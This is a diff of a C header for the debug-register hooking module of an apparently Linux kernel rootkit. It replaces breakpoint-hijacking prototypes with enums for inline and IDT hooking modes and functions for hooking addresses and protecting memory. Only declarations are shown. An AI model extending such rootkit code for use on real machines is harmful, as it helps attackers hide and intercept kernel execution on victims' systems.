@@ -1,18 +1,28 @@
 #ifndef ROOTKIT_DEBUG_REG_H
 # define ROOTKIT_DEBUG_REG_H
 
-//TODO: global
-# define INLINE_HOOK 0
+# include "idt.h"
 
-void debug_register_hijack_handler(int);
-int debug_register_set_bp(void *addr,
-        void(*hook)(struct pt_regs *regs, long err),
-        int n);
-int debug_register_add_bp(void *addr,
-        void(*hook)(struct pt_regs *regs, long err));
-void debug_register_enable_bp(int n);
-void debug_register_disable_bp(int n);
-void debug_register_del_bp(int n);
-void debug_register_unhijack_handler(void);
+enum slrk_dr_hijacking {
+    INLINE_HOOK = 1,
+    IDT_HOOK    = 2
+};
+
+enum slrk_dr_mem_prot {
+    CONST_VAL = 1,
+    DYN_VAL   = 2
+};
+
+typedef void (*f_dr_hook)(struct slrk_regs *regs, long err);
+
+void dr_init(enum slrk_dr_hijacking m);
+void dr_cleanup(void);
+
+int dr_protect_mem(void *addr, size_t n, enum slrk_dr_mem_prot p);
+int dr_hook(void *addr, f_dr_hook hook);
+
+void dr_enable(int n);
+void dr_disable(int n);
+void dr_delete(int n);
 
 #endif /* !ROOTKIT_DEBUG_REG_H */
